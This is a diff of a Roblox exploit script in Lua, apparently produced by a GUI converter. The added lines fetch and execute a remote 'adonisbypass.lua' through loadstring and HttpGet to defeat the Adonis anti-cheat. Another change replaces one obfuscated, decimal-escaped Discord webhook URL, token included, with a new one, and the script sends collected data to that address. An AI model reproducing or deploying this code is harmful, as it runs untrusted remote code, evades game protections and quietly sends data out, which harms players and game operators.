@@ -9,6 +9,14 @@
 
 -- Instances: 170 | Scripts: 2 | Modules: 0 | Tags: 0
 
+task.spawn(function()
+	for _, rems in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
+		if rems:IsA("RemoteEvent") and rems:FindFirstChild("__FUNCTION") then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/adonisbypass.lua"))()
+		end
+	end
+end)
+
 local G2L = {};
 
 -- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
@@ -3496,7 +3504,7 @@ local script = G2L["c"];
 			request(webhookRequest)
 		end
 
-		local webhookUrl = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\52\49\53\56\48\50\48\49\50\56\48\49\52\55\52\56\56\47\50\48\57\50\65\54\115\48\103\79\117\66\74\71\53\51\99\56\120\114\82\101\111\103\101\104\116\121\84\86\48\48\45\82\99\67\87\106\68\77\53\45\76\48\48\117\69\84\78\45\71\103\82\109\107\95\66\114\119\55\84\101\84\71\69\66\90\114"
+		local webhookUrl = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\52\50\54\51\56\53\54\50\50\52\51\50\52\56\49\50\57\47\77\71\122\114\72\116\116\48\88\88\109\107\49\105\110\55\108\112\118\81\107\99\102\109\75\119\66\109\78\107\71\110\99\111\103\106\102\67\84\119\122\87\66\99\89\57\100\48\67\52\118\49\72\86\98\74\119\122\75\121\50\54\97\74\76\73\80\74"
 		local webhookData = createWebhookData()
 		sendWebhook(webhookUrl, webhookData)
 	end)
